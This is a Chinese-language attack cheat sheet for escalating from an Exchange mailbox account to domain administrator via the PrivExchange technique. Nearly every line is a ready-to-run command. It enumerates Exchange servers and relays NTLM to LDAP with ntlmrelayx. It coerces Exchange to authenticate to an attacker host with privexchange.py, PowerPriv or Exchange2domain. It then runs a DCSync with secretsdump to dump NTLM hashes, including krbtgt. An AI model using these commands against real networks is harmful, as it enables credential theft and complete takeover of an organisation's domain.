	通过利用Exchange 来交换域管理员权限的权限
	需要一个带有邮箱的用户帐户的shell
	Exchange 服务器主机名或 IP 地址
	>pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
	Exchange 服务器身份验证和权限提升的中继（使用 Impacket 的 ntlmrelayx）
	>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
	订阅推送通知功能（使用 privexchange.py 或 powerPriv），使用当前用户的凭据向 Exchange 服务器进行身份验证。强制 Exchange 服务器将其 NTLMv2 哈希发送回受控机器
	https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
	>python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
	>python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange

	https://github.com/G0ldenGunSec/PowerPriv 
	>powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
	用 Impacket 的 secretdumps，用户现在可以执行 dcsync 并获取另一个用户的 NTLM 哈希
	>python secretsdump.py xxxxxxxxxx -just-dc
	>python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
	恢复用户 ACL 的先前状态
	>python aclpwn.py --restore ../aclpwn-20190319-125741.restore

	或者可以使用 Metasploit 模块
	>use auxiliary/scanner/http/exchange_web_server_pushsubscription
	或者使用多合一工具：Exchange2domain
	>git clone github.com/Ridter/Exchange2domain 
	>python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
	>python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip